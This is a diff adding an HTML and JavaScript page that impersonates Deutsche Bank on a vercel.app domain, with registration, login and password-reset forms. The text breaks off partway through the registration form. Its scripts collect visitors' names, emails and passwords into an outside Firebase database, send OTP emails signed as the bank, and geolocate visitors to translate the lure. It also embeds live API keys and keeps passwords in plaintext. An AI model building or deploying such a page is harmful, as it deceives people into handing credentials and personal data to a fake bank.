@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <meta name="google" content="notranslate"> 
+ <meta name="color-scheme" content="light">
+ <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" >
+<script type="module">
+  document.getElementById("overlay9").style.display ='block'
+  function detectDesktopMode() {
+            // Check if the device is a mobile device by user-agent
+            const isMobile = /android|iphone|ipad|ipod|windows phone/i.test(navigator.userAgent);
+
+            // Get the current viewport width
+            const viewportWidth = window.innerWidth;
+
+            const deviceStatusElement = document.getElementById("deviceStatus");
+
+            // If it's a mobile device and the viewport width is greater than 800px, we consider it "desktop mode"
+            if (isMobile && viewportWidth > 800) {
+                // Desktop Mode on Mobile
+       document.getElementById("overlay").style.display = "block";         
+          
+            } else if (isMobile && viewportWidth <= 800) {
+                // Mobile Mode
+               document.getElementById("overlay").style.display = "none";            // Mobile mode
+                
+            } else {
+      document.getElementById("overlay").style.display = "block";                    
+            }
+        }
+
+        // Detect device mode on page load
+        window.addEventListener("DOMContentLoaded", detectDesktopMode);
+
+        // Detect on window resize to handle desktop/mobile mode changes dynamically
+        window.addEventListener("resize", detectDesktopMode);
+
+        
+    function translateText(text, targetLanguage, callback) {
+        fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+            .then(response => response.json())
+            .then(data => {
+                const translatedText = data[0].map(item => item[0]).join('');
+                callback(translatedText);
+            })
+            .catch(error => { 
+       console.error('Error translating text:', error);
+ document.getElementById("overlay").style.display = "block";         
+  });
+    }
+
+    function detectCountry(callback) {
+        fetch('https://ipinfo.io/json?token=84581b889c1970') // Replace with your ipinfo.io token
+            .then(response => response.json())
+            .then(data => {
+                callback(data.country);
+         
+            })
+            .catch(error => {
+             console.error('Error detecting country:', error);
+  document.getElementById("overlay").style.display = "block";         
+    });
+}
+    const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en", 
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar", 
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz", 
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr", 
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr", 
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es", 
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr", 
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti", 
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr", 
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es", 
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is", 
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it", 
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko", 
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en", 
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en", 
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en", 
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar", 
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en", 
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur", 
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl", 
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en", 
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr", 
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so", 
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv", 
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt", 
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en", 
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi", 
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+        detectCountry(function(countryCode) {
+            const targetLanguage = countryLanguageMap[countryCode] || 'en';
+            translatePageText(targetLanguage);
+        });
+    });
+
+    function translatePageText(targetLanguage) {
+        const elementsToTranslate = [
+            
+    
+    { id: 'info-text-562', text: 'Please check that you are visiting the correct URL' },
+    
+    { id: 'email-password-header-341', text: 'Email and Password' },
+    { id: 'email-password-desc-726', text: 'Create a Deutsche profile with a few details. Your password should have at least 8 characters including letters and a number.' },
+    { id: 'fullname-label-199', text: 'Full Name' },
+    { id: 'email-label-467', text: 'Email Address' },
+    { id: 'password-label-681', text: 'Set Password' },
+    { id: 'confirm-password-label-542', text: 'Confirm Password' },
+    { id: 'already-have-account-104', text: 'Already have an account?' },
+    { id: 'mod4', text: 'Sign in' },
+    { id: 'back-text-731', text: 'Back' },
+    { id: 'confirm-header-925', text: 'Confirm Your Email Address' },
+    { id: 'confirm-desc-102', text: 'We will send a code to your email address to confirm its truly yours.' },
+    { id: 'otp-label-674', text: 'Verification Code' },
+    { id: 'resend-code-335', text: 'Resend Code' },
+    { id: 'signin-back-text-412', text: 'Back' },
+    { id: 'signin-header-431', text: 'Sign In' },
+    { id: 'signin-desc-831', text: 'To sign in, please type in the email linked to your Deutsche account.' },
+    { id: 'signin-email-label-215', text: 'Email Address' },
+    { id: 'signin-password-label-634', text: 'Password' },
+    { id: 'forgotten-password-text-315', text: 'Forgotten password?' },
+    { id: 'mod1a', text: 'Reset' },
+{ id: 'back-header-387', text: 'Back' },
+    { id: 'confirm-header-768', text: 'Confirm Your Email Address' },
+    { id: 'description-482', text: "We'll send a code to your email address to confirm it's truly yours." },
+    { id: 'verification-label-239', text: 'Verification Code' },
+    { id: 'resend-code-914', text: 'Resend Code' },
+    { id: 'back-header-122', text: 'Back' },
+    { id: 'reset-header-589', text: 'Reset Your Password' },
+    { id: 'reset-description-349', text: 'Reset your Deutsche account password with just a few clicks.' },
+    { id: 'reset-email-label-841', text: 'Email Address' },
+    { id: 'reset-password-label-914', text: 'Set Password' },
+    { id: 'confirm-password-label-211', text: 'Confirm Password' },
+    { id: 'back-header-503', text: 'Back' },
+    { id: 'confirm-header-217', text: 'Confirm Your Email Address' },
+    { id: 'description-703', text: "We'll send a code to your email address to confirm it's truly yours." },
+    { id: 'verification-label-945', text: 'Verification Code' },
+    { id: 'resend-code-811', text: 'Resend Code' }
+        ]
+  elementsToTranslate.forEach(element => {
+            translateText(element.text, targetLanguage, function(translatedText) {
+                document.getElementById(element.id).textContent = translatedText;
+          document.getElementById("overlay9").style.display ='none'
+            });
+        });
+      const placeholdersToTranslate = [
+                { id: 'registerPassword', text: 'Set Password' },
+     { id: 'loginPassword', text: 'Enter Password' },  
+       { id: 'resetPassword', text: 'Set Password' }, 
+         { id: 'coPassword', text: 'Confirm Password' },    
+       { id: 'confirmPassword', text: 'Confirm Password'}
+               
+            ];
+
+            placeholdersToTranslate.forEach(element => {
+                translateText(element.text, targetLanguage, function (translatedText) {
+                    document.getElementById(element.id).placeholder = translatedText;
+                });
+            }); 
+   
+   }
+   
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.20.0/firebase-app.js";
+    import { getDatabase, ref, set, get, update } from "https://www.gstatic.com/firebasejs/9.20.0/firebase-database.js";
+
+    // Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+        authDomain: "tuak-9f342.firebaseapp.com",
+        databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+        projectId: "tuak-9f342",
+        storageBucket: "tuak-9f342.firebasestorage.app",
+        messagingSenderId: "9176071516",
+        appId: "1:9176071516:web:38491206a78ed1c4035599",
+        measurementId: "G-BM58W3CJTQ"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app); 
+   emailjs.init("oG2-PQShPO15fq8qr");
+    let generatedOTP = null;
+
+  // Send OTP
+window.sendOTP = async (email) => {
+     // Generate OTP
+        const generatedOTP = Math.floor(100000 + Math.random() * 900000);
+    localStorage.setItem("generatedOTP", generatedOTP);
+  
+    try {
+        // Retrieve the email from localStorage
+        const email = localStorage.getItem("userEmail");
+        if (!email) {
+            console.error("No email found in localStorage.");
+            return;
+        }
+
+       
+
+        // Sanitize the email
+        const sanitizedEmail = email.replace(/\./g, ",");
+
+        // Reference the database
+        const emailRef = ref(database, `messages/${sanitizedEmail}`);
+
+        // Fetch data from the database
+        const snapshot = await get(emailRef);
+        if (!snapshot.exists()) {
+            console.error("No matching data found for the email.");
+            return;
+        }
+
+        // Get the fullName field
+        const data = snapshot.val();
+        const fullName = data.fullName;
+        if (!fullName) {
+            console.error("fullName field is missing in the database.");
+            return;
+        }
+// Detect country and translate
+        detectCountry(async (countryCode) => {
+            const targetLanguage = countryLanguageMap[countryCode] || "en";
+
+            // Translate email content
+            translateText(
+                "Here is your unique code to access your account please don't share or forward this code to anyone.",
+                targetLanguage,
+                async (translatedWelcome) => {
+      
+  // Translate email content
+            translateText(
+                "We have implemented these measures as an extra layer of security, which is extremely important to us.",
+                targetLanguage,
+                async (translatedWel) => {     
+    // Translate email content
+            translateText(
+                "Your One-Time Password",
+                targetLanguage,
+                async (translatedSub) => {    
+        // Translate email content
+            translateText(
+                "Hi",
+                targetLanguage,
+                async (translatedHi) => {
+        // Log the variables
+        console.log("to_email:", email);
+        console.log("otp_code:", generatedOTP);
+        console.log("deut:", "Deutsche Bank");
+        console.log("fullName:", fullName);
+
+        // Send email using Email.js
+        await emailjs.send("service_xz553ko", "template_ysq0olo", {
+            to_email: email,
+            otp_code: generatedOTP,
+            deut: "Deutsche Bank",
+            fullName: fullName,
+       hi: translatedHi,
+      here: translatedWelcome,
+      boma: translatedWel,
+    copy: "&copy; 2025 Deutsche Bank. All rights reserved.",
+     subject: translatedSub,
+     name: "Deutsche Bank",
+     }
+            );
+        });
+     });
+ });
+ });
+ });
+    }  catch (error) {
+        console.error("Failed to send OTP:", error);
+    }
+};
+
+    // Function to show a loading spinner inside a button
+        function showLoading(button) {
+            button.disabled = true;
+            button.innerHTML = '<div class="loader"></div>';
+        }
+
+        // Function to reset the button's original state
+        function resetButton(button, originalText) {
+            button.disabled = false;
+            button.innerHTML = originalText;
+        }
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({ pageLanguage: 'es' }, 'google_translate_element');
+    }
+
+  
+      function hideMessage(messageEl) {
+    setTimeout(() => {
+        messageEl.textContent = ""; // Clear the message
+        messageEl.classList.remove("error-message", "success-message"); // Remove styling classes
+    }, 4000); // 3000 milliseconds = 3 seconds
+}
+    function translateAndSetText(messageEl, text, targetLanguage) {
+    translateText(text, targetLanguage, (translatedText) => {
+        messageEl.textContent = translatedText;
+    });
+} 
+     // Function to load the last displayed iframe from localStorage
+function loadLastIframe() {
+    const lastIframeSrc = localStorage.getItem('lastIframeSrc1');
+    
+    if (lastIframeSrc) {
+        // If there's an iframe src in localStorage, display the iframe
+        const iframe = document.getElementById("iframe");
+        iframe.src = lastIframeSrc;
+        iframe.style.display = "block";
+        
+        // Hide the "kala" block
+        document.getElementById("kala").style.display = "none";
+    } else {
+        // If no iframe src is in localStorage, display "kala"
+        document.getElementById("kala").style.display = "block";
+        document.getElementById("iframe").style.display = "none";
+    }
+}
+
+// Save iframe source whenever it changes
+document.getElementById("iframe").addEventListener('load', function () {
+    const iframe = document.getElementById("iframe");
+    const currentSrc = iframe.src;
+
+    // Save the iframe source in localStorage
+    localStorage.setItem('lastIframeSrc', currentSrc);
+
+    // Ensure iframe is displayed and "kala" is hidden
+    iframe.style.display = "block";
+    document.getElementById("kala").style.display = "none";
+});
+
+// Load the last iframe on page load
+document.addEventListener("DOMContentLoaded", loadLastIframe);
+
+   
+   
+      
+     window.frankJoy = async (event) => {
+            event.preventDefault();
+        document.getElementById('frank').classList.add('loading2');        
+            const email = document.getElementById("registerEmail").value;
+ document.getElementById("registerEmail").value;
+      if (email && /\S+@\S+\.\S+/.test(email)) {
+        // Store the email in local storage
+        localStorage.setItem("userEmail", email); 
+    
+      }              
+            const password = document.getElementById("registerPassword").value;
+         const emailDisplay = document.getElementById('emailDisplay');
+        emailDisplay.textContent = email;
+            const confirmPassword = document.getElementById("confirmPassword").value;
+   const fullName = document.getElementById("fullName").value;   
+         const messageEl = document.getElementById("registerMessage");    
+            if (password !== confirmPassword) {
+
+const errorMessage = "Passwords Doesn’t Match";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+   messageEl.classList.add("error-message");        
+            hideMessage(messageEl);         
+          document.getElementById('frank').classList.remove('loading2');               
+                return;
+
+            }
+           const sanitizedEmail = email.replace(/\./g, ",");
+          const emailRef = ref(database, `messages/${sanitizedEmail}`);
+    const uniqueCodesRef = ref(database, `uniqueCodes`);
+    const snapshot = await get(emailRef);
+
+    if (snapshot.exists()) {
+      const errorMessage = "User Already Exits";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+   messageEl.classList.add("error-message");        
+            hideMessage(messageEl);    
+     document.getElementById('frank').classList.remove('loading2');        
+    return;
+    }
+ let uniqueCode = generateUniqueCode();
+ // Check uniqueness of the code
+    let uniqueCodeSnapshot = await get(uniqueCodesRef);
+    let codes = uniqueCodeSnapshot.exists() ? uniqueCodeSnapshot.val() : {};
+
+    while (codes[uniqueCode]) {
+        uniqueCode = generateUniqueCode(); // Regenerate if code exists
+    }
+
+    // Save the unique code to the uniqueCodes reference
+    codes[uniqueCode] = true;
+    await update(uniqueCodesRef, codes);
+
+    // Save the user's data
+    await set(emailRef, { password, amount: 0, uniqueCode, fullName });
+    
+  
+            await sendOTP(email);
+            document.getElementById("mod2").style.display = "none";
+            document.getElementById("mod1").style.display = "block";
+history.pushState({ modalOpe62: true }, ''); 
+window.addEventListener('popstate', (event) => {
+      if (!event.state?.modalOpe62) {
+     document.getElementById("mod1").style.display ='none'           
+ document.getElementById("mod2").style.display ='block'    
+ document.getElementById('frank').classList.remove('loading2');        
+   }
+   });
+
+  document.getElementById("mod3").style.display = "none";
+document.getElementById("mod9").style.display = "none";
+document.getElementById("mod1b").style.display = "none";     
+        
+        };
+   // Handle OTP Verification
+        window.frank3 = async (event) => {
+            event.preventDefault();
+         const button = event.target.querySelector('button');
+  const originalText = button.textContent;      
+         showLoading(button); 
+         const messageEl = document.getElementById("registerMessage2");  
+            const email = document.getElementById("registerEmail").value;
+ document.getElementById("registerEmail").value;
+      if (email && /\S+@\S+\.\S+/.test(email)) {
+        // Store the email in local storage
+        localStorage.setItem("userEmail", email); 
+    
+      }             
+            const fullName = document.getElementById("fullName").value;
+            const password = document.getElementById("registerPassword").value;
+       
+            const otp = document.getElementById("registerOTP").value;
+const storedOTP = localStorage.getItem("generatedOTP");
+            if (otp !== storedOTP) {
+        const errorMessage = "Invalid OTP";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+   messageEl.classList.add("error-message");        
+            hideMessage(messageEl);             
+          resetButton(button, originalText);       
+               return;
+            } else {
+               document.getElementById("kala").style.display ="none"     
+  document.getElementById("iframe").style.display ="block"     
+            const src = "index1.html";
+            document.getElementById("iframe").src = src;
+            localStorage.setItem('lastIframeSrc', src); // Save to localStorage
+           
+                
+            }
+            
+ 
+    }
+
+  // Utility function to generate a 10-digit random number
+function generateUniqueCode() {
+    return Math.floor(1000000000 + Math.random() * 9000000000); // Generate a 10-digit number
+}
+window.frankLogin = async function (event) {
+    event.preventDefault();
+      document.getElementById('frank5').classList.add('loading2');        
+    const messageEl = document.getElementById("loginMessage");
+    const email = document.getElementById("loginEmail").value;
+    const emailDisplay = document.getElementById('emailDisplay2');
+        emailDisplay.textContent = email; 
+    const password = document.getElementById("loginPassword").value;
+
+    // Validate email format
+    if (!email || !/\S+@\S+\.\S+/.test(email)) {
+               
+       document.getElementById('frank5').classList.remove('loading2');        
+        return;
+    }
+
+    // Store the email in local storage
+    localStorage.setItem("userEmail", email);
+
+document.getElementById("loginEmail").value;
+      if (email && /\S+@\S+\.\S+/.test(email)) {
+        // Store the email in local storage
+        localStorage.setItem("userEmail", email); 
+    
+      }   
+    const sanitizedEmail = email.replace(/\./g, ",");
+    const emailRef = ref(database, `messages/${sanitizedEmail}`);
+
+    try {
+        const snapshot = await get(emailRef);
+
+        if (snapshot.exists() && snapshot.val().password === password) {
+            // Send OTP to the email
+            await sendOTP(email);
+           
+  document.getElementById("mod3").style.display ='none'
+   document.getElementById("mod6").style.display ='block' 
+      history.pushState({ modalOpe31: true }, ''); 
+window.addEventListener('popstate', (event) => {
+      if (!event.state?.modalOpe31) {
+     document.getElementById("mod6").style.display ='none'           
+   document.getElementById("mod3").style.display ='none'
+ document.getElementById("mod2").style.display ='block'
+ document.getElementById('frank5').classList.remove('loading2');        
+   }
+   });
+        
+        } else {
+            const errorMessage = "Invalid Email or Password";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+            messageEl.classList.add("error-message");   
+     hideMessage(messageEl);      
+   document.getElementById('frank5').classList.remove('loading2');           
+        return;
+        }
+    } catch (error) {
+        console.error("Error during login:", error);
+       const errorMessage =  "An error occurred. Please try again."
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+   document.getElementById('frank5').classList.remove('loading2');           
+        });
+       messageEl.classList.add("error-message");   
+     hideMessage(messageEl);   
+   document.getElementById('frank5').classList.remove('loading2');        
+   return;
+    }
+};
+window.frank6 = async function (event) {
+ event.preventDefault();
+document.getElementById('frank7').classList.add('loading2');        
+  
+  const messageEl = document.getElementById("loginMessage2");
+ const otp = document.getElementById("registerOTP1").value;
+const storedOTP = localStorage.getItem("generatedOTP");
+            if (otp !== storedOTP) {
+  const errorMessage =  "Incorrect OTP"
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+  messageEl.classList.add("error-message");   
+     hideMessage(messageEl);                
+                
+       document.getElementById('frank7').classList.remove('loading2');        
+          
+                return;
+            } 
+if (otp == storedOTP) {
+                
+            const errorMessage = "Login Successful";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+  messageEl.classList.add("success-message");   
+     hideMessage(messageEl);                
+          document.getElementById('frank7').classList.remove('loading2');        
+  
+          document.getElementById("kala").style.display ="none"     
+  document.getElementById("iframe").style.display ="block"     
+            const src = "index1.html";
+            document.getElementById("iframe").src = src;
+            localStorage.setItem('lastIframeSrc', src); // Save to localStorage
+         
+            } 
+}
+window.resetDetails = async function (event) {
+document.getElementById('frane1').classList.add('loading2');    
+   const originalText = button.textContent;
+     showLoading(button); 
+     const messageEl = document.getElementById("resetMessage");        
+             const email = document.getElementById("resetEmail").value;
+   document.getElementById("resetEmail").value;
+      if (email && /\S+@\S+\.\S+/.test(email)) {
+        // Store the email in local storage
+        localStorage.setItem("userEmail", email); 
+    
+      }    
+    const emailDisplay = document.getElementById('emailDisplay3');
+        emailDisplay.textContent = email;         
+            const password = document.getElementById("resetPassword").value;
+            const confirmPassword = document.getElementById("coPassword").value;
+
+  if (password !== confirmPassword) {
+       const errorMessage = "Passwords doesn’t Match";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+  messageEl.classList.add("error-message");   
+     hideMessage(messageEl);                  
+        document.getElementById('frane1').classList.remove('loading2');           
+                return;
+            }
+ await sendOTP(email);
+            document.getElementById("mod2").style.display = "none";
+            document.getElementById("mod1").style.display = "none";
+document.getElementById("mod3").style.display = "none";
+document.getElementById("mod9").style.display = "none";
+document.getElementById("mod1b").style.display = "block";
+history.pushState({ modalOpe53: true }, ''); 
+window.addEventListener('popstate', (event) => {
+      if (!event.state?.modalOpe53) {
+     document.getElementById("mod1b").style.display ='none'           
+ document.getElementById("mod2").style.display ='block'           
+ document.getElementById('frane1').classList.remove('loading2');    
+   }
+   });
+
+
+}
+window.resetOtp = async function (event) {
+ event.preventDefault();
+       
+  const messageEl = document.getElementById("resetMessage2");   
+   const email = document.getElementById("resetEmail").value;
+      if (email && /\S+@\S+\.\S+/.test(email)) {
+        // Store the email in local storage
+        localStorage.setItem("userEmail", email); 
+    
+      }   
+const password = document.getElementById("resetPassword").value;
+ const otp2 = document.getElementById("registerOTP4").value;
+
+const storedOTP = localStorage.getItem("generatedOTP");
+            if (otp2 !== storedOTP) {
+    const errorMessage = "Incorrect OTP";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+  messageEl.classList.add("error-message");   
+     hideMessage(messageEl);                  
+      
+                return;
+            } 
+
+            if (otp2 == storedOTP) {
+
+                
+               const sanitizedEmail = email.replace(/\./g, ",");
+        const emailRef = ref(database, `messages/${sanitizedEmail}`);
+        const snapshot = await get(emailRef);
+
+        if (snapshot.exists()) {
+            await update(emailRef, { password });
+    const errorMessage =  "Password Changed Successfully";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+  messageEl.classList.add("success-message");   
+     hideMessage(messageEl);                       
+           
+           document.getElementById("kala").style.display ="none"     
+  document.getElementById("iframe").style.display ="block"     
+            const src = "index1.html";
+            document.getElementById("iframe").src = src;
+            localStorage.setItem('lastIframeSrc', src); // Save to localStorage
+        
+            } 
+      else {
+      const errorMessage = "User Doesn’t Exits.";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(messageEl, errorMessage, targetLanguage);
+        });
+      messageEl.classList.add("error-message");   
+     hideMessage(messageEl);      
+       
+        }     
+           
+            } 
+
+
+}
+  // Listen for online and offline events
+      // Add an event listener for the online event
+    window.addEventListener('online', () => {
+      console.log('Internet connection restored. Reloading page...');
+      location.reload(); // Reload the page when the connection is restored
+    });
+
+    // Optional: Add a listener for the offline event for logging
+    window.addEventListener('offline', () => {
+      console.log('Internet connection lost.');
+    });
+</script>
+  <style>
+ @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+
+  body {
+  background-image: url('world2.jpg'); /* Replace with the generated globe image */
+  background-size: cover; /* Ensures the image covers the screen */
+  
+  background-repeat: no-repeat;
+}
+   .text-bold {
+      font-family: "Poppins", sans-serif;
+   
+    }
+ .loader {
+           position: absolute;
+            width: 12px;
+            height: 12px;
+            border: 3px solid transparent;
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.3s linear infinite;
+            visibility: hidden;
+       display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    .loading2 .button-text1 {
+            visibility: hidden;
+        }
+  .loading2 .loader {
+            visibility: visible;
+       margin-left: -29px;
+       padding-top: 2%;
+               }
+
+.ella {
+    transform: rotate(25deg); /* Adjust rotation angle as needed */
+    display: inline-block;
+margin-left: 5%;
+font-size: 20px;
+}
+  
+   .word{
+      width: 89%;
+      height: 43px;
+  font-size: 17px;
+  color: black;
+  padding: 0 15px;
+ font-family: "Poppins", sans-serif;
+   } 
+ input{
+        border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+            outline: none;
+ font-weight: 400;
+ box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+margin-top: 2%;
+bottom: 2px;
+ }
+   input:focus {
+            border-color: #4b0082;
+            box-shadow: 0 0 5px rgba(75, 0, 130, 0.5);
+        }
+ .toggle-password {
+     position: absolute;
+     right: 60px;
+ margin-top: 16px;
+ }
+ .word1{
+     margin-top: 2%;
+ color: #333;
+font-family: "Poppins", sans-serif;
+ font-size: 15px;
+ }
+  
+  .word3{
+   padding: 13px;
+         font-family: "Poppins", sans-serif;
+            font-size: 16px;
+            font-weight: 400;
+            color: #ffffff;
+            background-color: #d3c3e5;
+            border: none;
+            border-radius: 6px;
+            cursor: not-allowed;   
+width: 40%;
+margin-top: 3%;
+  }
+    .word3.active {
+            background-color: #4b0082;
+            
+        }
+   
+  .header5d {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+       margin-top: 2%;
+        
+        }
+ .back-arrow1 {
+      width: 10px;
+      height: 10px;
+      border-left: 1.3px solid purple;
+      border-bottom: 1.3px solid purple;
+      transform: rotate(45deg);
+      margin-left: -82%;
+      position: absolute;
+  
+    }
+
+#frank4.active{
+            background-color: #4b0082;
+            
+        }
+ .error-message {
+     color: red;
+     display: block;
+font-family: "Poppins", sans-serif;
+ }
+  .success-message {
+     color: #3fc900;
+     display: block;
+font-family: "Poppins", sans-serif;
+ }
+  /* Animation styles for .hand */
+.hand {
+  opacity: 0; /* Initially hidden */
+  transform: scale(0.7) translateY(25px); /* Smaller size and slightly moved down */
+  transition: opacity 0.5s ease-out, transform 0.5s ease-out; /* Smooth animation */
+}
+
+/* Active state for animation */
+.hand.fade-up-zoom-in {
+  opacity: 1; /* Fully visible */
+  transform: scale(1) translateY(0); /* Back to normal size and position */
+}
+  
+  #mod3 {
+  opacity: 0; /* Initially hidden */
+  transform: scale(0.7) translateY(25px); /* Smaller size and slightly moved down */
+  transition: opacity 0.5s ease-out, transform 0.5s ease-out; /* Smooth animation */
+}
+
+/* Active state for animation */
+#mod3.fade-up-zoom-in {
+  opacity: 1; /* Fully visible */
+  transform: scale(1) translateY(0); /* Back to normal size and position */
+}
+  </style>
+</head>
+<body>
+
+ <div style="display: none"id="kala">
+<div style="position: fixed; background-color: white; height: 100%; width: 100%; z-index: 9999999999999999; margin-left: -2%; margin-top: -1.5%; display: none;" id="overlay"></div>
+<div style="position: fixed; background-color: white; height: 100%; width: 100%; z-index: 9999999999999999; margin-left: -2%; margin-top: -1.5%; display: none;" id="overlay9"></div>
+
+   <div id="ella1"></div>
+ <div style="display: flex; ">
+ <div style="font-size: 20px; font-weight: 800; margin-left: 3%; color: #4b2b7f; border: 2px solid #4b2b7f; width: 3%; text-align: center; justify-content: center; align-items: center;  padding: 0px 9px; padding-top: 2px;"><span class="ella">/</span></div>
+<div class="text-bold" style="font-size: 20px; font-weight: 800; margin-left: 2%; color: #4b2b7f;" id="header-472">Deutsche Bank.</div>
+</div>
+<div style="margin-top: 10%; padding: 18px; margin-left: 8%;" id="info-container-281">
+  <div class="text-bold" style="font-size: 13px; font-weight: 500; color: #4b2b7f; line-height: 1.2; " ><span id="info-text-562">Please check that you are visiting the correct URL</span>
+  <span style="font-size: 13px; font-weight: 570; color: #00b712;" id="secure-url-438">https://Deutsche.vercel.app</span>
+  </div>
+</div>
+
+<div class="hand" id="mod2" style="display: none;">
+  <div class="text-bold" style="font-weight: 650; font-size: 21px; margin-top: 4%; margin-left: 6%; color: black; " id="email-password-header-341">Email & Password</div>
+  <div class="text-bold" style="font-size: 14px; color: #888; font-weight: 400; padding: 23px; margin-top: -4%; " id="email-password-desc-726" >
+    Create a Deutsche profile with a few details. Your password should have at least 8 characters including letters and a number.
+  </div>
+  <div style="margin-left: 6%; background-color: rgba(255, 0, 0, 0.0); margin-top: -3%;" id="form-container-958">
+    <div class="word1" id="fullname-label-199">Full Name</div>
+    <form onsubmit="frankJoy(event)" id="register-form-813">
+      <input class="word" id="fullName" required>
+      <span style="margin-top: 2%; font-size: 15px; font-weight: 500; margin-left: 2%; display: block;" id="registerMessage"></span>
+      <div class="word1" id="email-label-467">Email Address</div>
+      <input type="email" class="word" id="registerEmail" required>
+      <div class="word1" id="password-label-681">Set Password</div>
+      <input class="word" type="password" id="registerPassword" placeholder="Set password" required>
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('registerPassword')" id="toggle-password-367">visibility</span>
+      <div class="word1" id="confirm-password-label-542">Confirm Password</div>
